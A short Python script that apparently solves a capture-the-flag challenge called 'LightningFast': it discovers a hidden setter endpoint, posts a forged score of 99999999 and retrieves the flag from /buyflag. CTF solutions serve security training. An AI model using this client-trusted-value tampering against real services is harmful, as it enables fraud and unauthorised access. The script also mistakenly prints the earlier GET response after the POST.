import requests
import argparse
import json

parser = argparse.ArgumentParser(description='Solves the following Challenge: LightningFast')
parser.add_argument('--ip', action='store', help='challenge IP address, ex: 94.237.60.129', required=True)
parser.add_argument('--port', action='store', help='challenge port number, ex: 56522', required=True)
challenge = parser.parse_args()

print(">> GET /endpoints")
g = requests.get(f"http://{challenge.ip}:{challenge.port}/endpoints")
print(f"<< {g.text}")
getter = json.loads(g.text)["getter"]
setter = json.loads(g.text)["setter"]

score = json.loads('{"score":99999999}')

print(f">> POST /{setter}")
print(f">> {score}")
p = requests.post(f"http://{challenge.ip}:{challenge.port}/{setter}", data=score)
print(f"<< {g.text}")

g = requests.get(f"http://{challenge.ip}:{challenge.port}/buyflag")
flag = json.loads(g.text)["result"]
print(f"\n[*] Challenge solved: {flag}")
